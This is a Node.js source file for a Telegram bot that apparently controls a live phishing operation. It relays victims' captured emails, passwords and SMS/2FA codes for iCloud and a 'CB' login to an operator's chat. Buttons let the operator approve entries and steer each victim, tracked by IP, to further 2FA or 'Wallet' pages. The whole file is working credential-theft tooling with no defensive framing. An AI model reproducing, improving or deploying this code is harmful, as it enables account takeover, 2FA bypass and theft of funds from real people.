const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot — polling with timeout to reduce conflicts
const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: true,
    params: {
      timeout: 10
    }
  }
});

bot.getMe().then(() => {
  console.log("✅ Bot connected successfully.");
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

// Suppress 409 polling errors and auto-restart after delay
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409 Conflict")) {
    console.warn("⚠️ Polling conflict — another instance may be running. Restarting in 5s...");
    bot.stopPolling().then(() => {
      setTimeout(() => bot.startPolling(), 5000);
    });
  } else {
    console.error("❌ Polling error:", err.message);
  }
});

// Track pending 2FA requests per chatId
let pendingRequests = {};

// Track already-handled callback IDs to prevent duplicate processing
const handledCallbacks = new Set();

// -----------------
// Email/Password approval (unchanged)
// -----------------
function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// Generic code approval (unchanged)
// -----------------
function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Approval Requested*\nIdentifier: ${identifier}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// iCloud SMS approval
// -----------------
async function sendApprovalRequestSMS(code, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// iCloud Login approval
// -----------------
async function sendApprovalRequestPage(email, password, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// CB Login approval
// -----------------
async function sendLoginTelegram(email, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
        ],
        [
          { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
        ],
        [
          { text: "❌ Reject ❌", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// Verify page approval (3 buttons, no reject)
// -----------------
async function sendVerifyTelegram(ip, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
        [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// 2FA Code sender (keyboard-based Accept/Reject)
// -----------------
function send2FACode(code, chatId) {
  pendingRequests[chatId] = true;
  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
    reply_markup: {
      keyboard: [["Accept", "Reject"]],
      one_time_keyboard: true,
    },
  });
}

// -----------------
// Handle plain text messages (keyboard Accept/Reject)
// -----------------
bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  if (pendingRequests[chatId]) {
    if (msg.text === "Accept") {
      bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
      delete pendingRequests[chatId];
    } else if (msg.text === "Reject") {
      bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
      delete pendingRequests[chatId];
    }
  }
});

// -----------------
// Handle inline button callbacks
// -----------------
bot.on("callback_query", async (query) => {
  // Ignore if already handled (prevents duplicates from polling restarts)
  if (handledCallbacks.has(query.id)) return;
  handledCallbacks.add(query.id);
  setTimeout(() => handledCallbacks.delete(query.id), 60000);

  try {
    const [action, identifier] = query.data.split("|");
    let status;

    // --- Handle 2FA approve/reject ---
    if (action === "2fa_approve" || action === "2fa_reject") {
      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
      const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
      });

      // Step 1: Remove buttons, keep info message visible
      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
          }
        );
      } catch (_) {}

      // Step 2: Send status below
      const msgText = query.message.text || "";
      const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
      const displayCode = smsMatch ? smsMatch[1].trim() : null;

      const twoFaStatusText = displayCode
        ? `💬 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
        : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;

      await bot.sendMessage(
        query.message.chat.id,
        twoFaStatusText,
        { parse_mode: "HTML" }
      );

      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
      return;
    }

    // --- Handle all other approvals ---
    if (action === "accept") status = "accepted";
    else if (action === "page1") status = "accepted1";
    else if (action === "page2") status = "accepted2";
    else if (action === "page3") status = "accepted3";
    else status = "rejected";

    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3"].includes(status);
    const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";

    // Notify backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, identifier, status })
    });

    // Step 1: Remove buttons but KEEP the original info message visible
    try {
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id
        }
      );
    } catch (_) {}

    // Step 2: Send status below the original message
    let replyText;
    if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>🏁 Done Page 🏁</b>`;
    } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>🔐 Last 2FA 🔐</b>`;
    } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>💼 Wallet 💼</b>`;
    } else {
      const isSMS = /^\d+$/.test(identifier);
      replyText = isSMS
        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
        : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
    }

    await bot.sendMessage(
      query.message.chat.id,
      replyText,
      { parse_mode: "HTML" }
    );

    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// -----------------
// Commands
// -----------------
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.\nPlease enter your 2FA code if prompted.");
});

bot.onText(/\/startcb/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});

module.exports = {
  bot,
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  sendVerifyTelegram,
  send2FACode
};
